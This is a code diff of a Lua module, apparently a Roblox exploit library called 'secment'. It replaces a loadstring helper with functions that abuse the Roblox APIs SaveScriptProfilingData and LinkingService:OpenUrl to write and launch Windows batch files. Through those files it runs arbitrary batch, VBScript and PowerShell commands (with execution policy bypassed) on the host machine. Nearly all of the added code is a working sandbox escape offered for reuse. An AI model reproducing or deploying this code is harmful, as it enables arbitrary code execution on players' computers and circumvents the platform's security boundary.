@@ -1,34 +1,35 @@
-local add = {}
-local functions = {
-    io = {
-write = [[getgenv().print = function(msg)
-        print("Secment : " .. tostring(msg) .. "\n")
-    end]]
-}
-}
+local secment = {}
 
-function add:func(path)
-    local name, child = path:match("([^%.]+)%.([^%.]+)")
-    
-    if name and child then
-        local new = functions[name][child]
-        loadstring(new)()
-    else
-        local new = functions[path]
-        loadstring(new)()
-    end
+function secment.bat(code)
+    local name = math.random(100000, 999999)
+    local batContent = [[
+@echo off
+]] .. code .. [[
+]]
+    local batFileName = tostring(name) .. ".bat"
+    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(batContent, batFileName))
 end
 
-function add:keysystem(script, code)
-    local key = getgenv().key
+function secment.vbs(code)
+    secment.bat([[ 
+@echo off
+setlocal
 
-    if key == code then
-        loadstring(script)()
-    else
-        print("Invalid key.")
-    end
+(
+echo ]] .. code .. [[
+) > temp_script.vbs
+
+cscript //nologo temp_script.vbs
+del temp_script.vbs
+]])
 end
 
+function secment.powershell(code)
+    secment.bat([[Powershell.exe -ExecutionPolicy Bypass -Command "]] .. code .. [[" & del temp_script.ps1]])
+end
 
+function secment.msgbox(message)
+    secment.powershell([[Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(']] .. message .. [[')]])
+end
 
-return add
+return secment
